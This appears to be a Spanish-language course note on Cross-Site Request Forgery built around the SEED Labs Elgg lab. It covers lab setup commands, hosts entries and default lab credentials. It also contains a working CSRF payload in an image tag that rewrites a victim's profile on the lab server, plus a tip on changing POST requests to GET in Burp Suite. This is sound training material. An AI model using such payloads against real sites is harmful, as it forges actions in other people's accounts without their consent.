- Tags : #csrf #recursos_github 

**AVISO (Actualización 11/05/2023)**: Si a la hora de hacer el ‘**docker-compose up -d**‘, os salta un error de tipo: “**networks.net-10.9.0.0 value Additional properties are not allowed (‘name’ was unexpected)**“, lo que tenéis que hacer es en el archivo ‘**docker-compose.yml**‘, borrar la línea número 41, la que pone “**name: net-10.9.0.0**“.

Con hacer esto, ya podréis desplegar el laboratorio sin ningún problema.

El **Cross-Site Request Forgery** (**CSRF**) es una vulnerabilidad de seguridad en la que un atacante **engaña** a un usuario legítimo para que realice una acción no deseada en un sitio web sin su conocimiento o consentimiento.

En un ataque CSRF, el atacante engaña a la víctima para que haga clic en un enlace malicioso o visite una página web maliciosa. Esta página maliciosa puede contener una solicitud HTTP que realiza una acción no deseada en el sitio web de la víctima.

Por ejemplo, imagina que un usuario ha iniciado sesión en su cuenta bancaria en línea y luego visita una página web maliciosa. La página maliciosa contiene un formulario que envía una solicitud HTTP al sitio web del banco para transferir fondos de la cuenta bancaria del usuario a la cuenta del atacante. Si el usuario hace clic en el botón de envío sin saber que está realizando una transferencia, el ataque CSRF habrá sido exitoso.

El ataque CSRF puede ser utilizado para realizar una amplia variedad de acciones no deseadas, incluyendo la transferencia de fondos, la modificación de la información de la cuenta, la eliminación de datos y mucho más.

Para prevenir los ataques CSRF, los desarrolladores de aplicaciones web deben implementar medidas de seguridad adecuadas, como la inclusión de tokens CSRF en los formularios y solicitudes HTTP. Estos tokens CSRF permiten que la aplicación web verifique que la solicitud proviene de un usuario legítimo y no de un atacante malintencionado (aunque cuidadín que también se pueden hacer cositas con esto).

Os compartimos a continuación el enlace al comprimido ZIP que utilizamos en esta clase para desplegar el laboratorio donde practicamos esta vulnerabilidad:

- **Lab Setup**: [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)

```bash
wget  [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)

unzip Labsetup.zip

cd Labsetup

docker-compose up -d

#Contemplar en el /etc/hosts las direcciones de los contenedores ya que estan con ips privadas
10.10.9.5 www.seed-server.com
10.10.9.5 www.example32.com
10.10.9.105 www.attacker32.com

Usuarios para los ejercicios
user:pass

alice:seedalice
samy:seedsamy


```

Básicamente lo que se intenta es enviar una petición get a un usuario para que ejecute un petición dentro del mismo servidor , una de las formas mas comunes es enviar una img con la petición eje

```html
<img src="http://www.seed-server.com/peticion con las indicaciones"/>

<img src="http://www.seed-server.com/action/profile/edit?name=Alice+T%c3%b3xica&
description=%3cp%3eSoy+un+compa%c3%b1era+de+trabajo+t
%c3%b3xico%2c+no+soporto+a+mi+jefe+dado+que+no+me+aumenta+el+sueldo%3c%2fp%3e%0d%0a&
accesslevel%5bdescription%5d=2&briefdescription=Alicia+la+super+t%c3%b3xica&accesslevel%5bbriefdescription%5d=2&
location=&accesslevel%5blocation%5d=2&interests=&accesslevel%5binterests%5d=2&skills=&
accesslevel%5bskills%5d=2&contactemail=&accesslevel%5bcontactemail%5d=2&phone=&accesslevel%5bphone%5d=2&
mobile=&accesslevel%5bmobile%5d=2&website=&accesslevel%5bwebsite%5d=2&twitter=&
accesslevel%5btwitter%5d=2&guid=56" />

```

Es importante entender que debemos ver en los sitios web con una cuenta propia si tenemos la capacidad para inyectar estas consultas get. Desde burpsuit se pueden cambiar las consultas de POST a GET t de permitirlo el servidor pues aquí tendremos un punto de entrada

![[Pasted image 20260121164544.png]]